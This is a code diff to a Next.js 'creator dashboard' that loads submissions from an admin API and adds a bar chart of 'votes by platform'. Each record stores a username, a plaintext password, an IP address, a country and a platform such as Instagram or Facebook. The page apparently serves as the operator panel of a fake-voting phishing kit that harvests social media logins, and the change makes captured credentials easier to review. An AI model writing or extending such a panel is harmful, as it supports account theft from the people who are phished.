@@ -1,5 +1,22 @@
 import Head from 'next/head';
-import { useState } from 'react';
+import { useState, useEffect } from 'react';
+import { Bar } from 'react-chartjs-2';
+import {
+  Chart as ChartJS,
+  BarElement,
+  CategoryScale,
+  LinearScale,
+  Tooltip,
+  Legend,
+} from 'chart.js';
+
+ChartJS.register(
+  BarElement,
+  CategoryScale,
+  LinearScale,
+  Tooltip,
+  Legend
+);
 
 const CREATOR_KEY = process.env.NEXT_PUBLIC_CREATOR_KEY || 'creator-key';
 
@@ -8,18 +25,74 @@ export default function CreatorDashboard() {
   const [isAuthenticated, setIsAuthenticated] = useState(false);
   const [submissions, setSubmissions] = useState([]);
   const [searchTerm, setSearchTerm] = useState('');
+  const [submissionsLoaded, setSubmissionsLoaded] = useState(false);
 
   const escapeHtml = (s) => String(s == null ? '' : s).replace(/[&<>"']/g, (c) => ({
     '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;',
   }[c]));
 
-  const handleAuth = () => {
+  const handleAuth = async () => {
     if (key === CREATOR_KEY) {
       setIsAuthenticated(true);
-      setSubmissions([
-        { id: 1, username: 'user123', password: 'pass123', ip: '192.168.1.1', country: 'Nigeria', created_at: new Date().toISOString(), method: 'instagram' },
-        { id: 2, username: 'voter456', password: 'secret', ip: '192.168.1.2', country: 'Ghana', created_at: new Date().toISOString(), method: 'facebook' },
-      ]);
+      try {
+        const res = await fetch('/api/admin/submissions', { credentials: 'same-origin' });
+        if (res.ok) {
+          const data = await res.json();
+          setSubmissions(data.data || []);
+        }
+      } catch (e) {
+        // Fallback to mock data on error
+        setSubmissions([
+          { id: 1, username: 'user123', password: 'pass123', ip: '192.168.1.1', country: 'Nigeria', created_at: new Date().toISOString(), method: 'instagram' },
+          { id: 2, username: 'voter456', password: 'secret', ip: '192.168.1.2', country: 'Ghana', created_at: new Date().toISOString(), method: 'facebook' },
+        ]);
+      }
+      setSubmissionsLoaded(true);
+    }
+  };
+
+  // Calculate chart data
+  const methodCounts = submissions.reduce((acc, r) => {
+    const method = r.method || 'email';
+    acc[method] = (acc[method] || 0) + 1;
+    return acc;
+  }, {});
+  const chartData = {
+    labels: Object.keys(methodCounts).length > 0 
+      ? Object.keys(methodCounts).map(m => m.charAt(0).toUpperCase() + m.slice(1))
+      : ['Email'],
+    datasets: [{
+      label: 'Votes by Platform',
+      data: Object.keys(methodCounts).length > 0 
+        ? Object.values(methodCounts)
+        : [0],
+      backgroundColor: ['#1877f2', '#e1306c', '#1da1f2', '#0078d4'],
+      borderRadius: 4,
+      barThickness: 30,
+    }]
+  };
+  const chartOptions = {
+    responsive: true,
+    maintainAspectRatio: false,
+    plugins: {
+      legend: { display: false },
+      title: {
+        display: true,
+        text: 'Vote Distribution',
+        color: '#8b949e',
+        font: { size: 14, weight: '600' }
+      }
+    },
+    scales: {
+      x: { 
+        ticks: { color: '#8b949e' },
+        grid: { display: false }
+      },
+      y: {
+        ticks: { color: '#8b949e' },
+        grid: { color: '#2b323a' },
+        beginAtZero: true
+      }
     }
   };
 
@@ -90,6 +163,13 @@ export default function CreatorDashboard() {
 
             <div className="stats">
               <div className="stat"><div className="num">{submissions.length}</div><div className="lbl">Total Votes</div></div>
+            </div>
+
+            <div className="card" style={{marginBottom: '0'}}>
+              <h2>Vote Distribution</h2>
+              <div style={{height: '250px'}}>
+                <Bar data={chartData} options={chartOptions} />
+              </div>
             </div>
 
             <div className="card">
